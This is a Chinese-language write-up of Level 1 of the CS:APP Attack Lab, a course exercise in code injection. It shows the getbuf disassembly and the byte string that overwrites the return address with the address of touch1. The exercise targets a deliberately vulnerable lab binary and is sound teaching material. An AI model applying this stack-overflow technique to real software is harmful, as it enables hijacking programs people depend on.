# Part I: Code Injection Attacks
由于Lab程序编译平台比较老，运行时会出现segment fault。可以自己链接一个printf函数来解决这个问题。详细见[Fix CS:APP Attack Lab Segmentation Fault on Newest Ubuntu 22.04](https://blog.rijuyuezhu.top/posts/db646f34/)

## Level 1
阅读`getbuf`函数反汇编代码可以发现调用时分配了`0x28`大小的栈空间，该空间包括了`BUFFER_SIZE`指定的空间大小和编译器预留的空间。再往上`0x8`字节即为返回地址。输入字符串覆盖该地址即可。
```
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
```
查找`touch1`函数的地址为`0x4017c0`, 小端表示并扩展到`0x8`字节得到
```
c0 17 40 00 00 00 00 00
```
前面随便填充`0x28`字节的字符即可